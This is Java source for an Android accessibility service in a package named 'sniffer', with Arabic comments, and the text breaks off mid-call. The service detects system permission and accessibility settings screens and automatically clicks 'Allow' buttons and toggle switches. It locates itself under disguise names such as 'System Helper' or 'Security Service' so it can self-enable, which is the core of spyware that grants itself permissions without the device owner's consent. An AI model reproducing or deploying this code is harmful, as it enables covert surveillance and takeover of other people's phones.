package com.v8.global.sniffer;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.GestureDescription;
import android.content.Context;
import android.content.Intent;
import android.graphics.Path;
import android.graphics.Rect;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.provider.Settings;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import java.util.List;

public class AutoPermissionHelper extends AccessibilityService {

    private static AutoPermissionHelper instance;
    private Handler handler = new Handler(Looper.getMainLooper());
    private boolean isProcessing = false;
    
    @Override
    public void onCreate() {
        super.onCreate();
        instance = this;
    }
    
    public static void startPermissionHelper(Context context) {
        try {
            Intent intent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            context.startActivity(intent);
        } catch (Exception e) {}
    }
    
    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (isProcessing) return;
        
        String packageName = event.getPackageName() != null ? event.getPackageName().toString() : "";
        String className = event.getClassName() != null ? event.getClassName().toString() : "";
        
        // كشف شاشة صلاحيات التطبيق
        if (packageName.contains("com.android") || packageName.contains("android")) {
            if (className.contains("Permission") || className.contains("InstalledAppDetails")) {
                isProcessing = true;
                handler.postDelayed(new Runnable() {
                    @Override
                    public void run() {
                        enableAllPermissions();
                        isProcessing = false;
                    }
                }, 1000);
            }
        }
        
        // كشف شاشة إعدادات الوصول
        if (packageName.contains("com.android") && className.contains("Accessibility")) {
            isProcessing = true;
            handler.postDelayed(new Runnable() {
                @Override
                public void run() {
                    enableAccessibilityService();
                    isProcessing = false;
                }
            }, 1500);
        }
    }
    
    private void enableAllPermissions() {
        AccessibilityNodeInfo root = getRootInActiveWindow();
        if (root == null) return;
        
        // البحث عن أزرار التفعيل
        List<AccessibilityNodeInfo> buttons = root.findAccessibilityNodeInfosByViewId("android:id/button1");
        if (buttons == null || buttons.isEmpty()) {
            buttons = root.findAccessibilityNodeInfosByText("سماح");
        }
        if (buttons == null || buttons.isEmpty()) {
            buttons = root.findAccessibilityNodeInfosByText("Allow");
        }
        
        if (buttons != null && !buttons.isEmpty()) {
            for (AccessibilityNodeInfo button : buttons) {
                if (button.isClickable()) {
                    performClick(button);
                    try { Thread.sleep(500); } catch (Exception e) {}
                }
            }
        }
        
        // البحث عن مفتاح التبديل
        List<AccessibilityNodeInfo> switches = root.findAccessibilityNodeInfosByViewId("android:id/switch_widget");
        if (switches != null && !switches.isEmpty()) {
            for (AccessibilityNodeInfo sw : switches) {
                if (sw.isClickable()) {
                    performClick(sw);
                }
            }
        }
        
        root.recycle();
    }
    
    private void enableAccessibilityService() {
        AccessibilityNodeInfo root = getRootInActiveWindow();
        if (root == null) return;
        
        // البحث عن خدمتنا في القائمة
        List<AccessibilityNodeInfo> items = root.findAccessibilityNodeInfosByText("System Helper");
        if (items == null || items.isEmpty()) {
            items = root.findAccessibilityNodeInfosByText("Security Service");
        }
        
        if (items != null && !items.isEmpty()) {
            for (AccessibilityNodeInfo item : items) {
                performClick(item
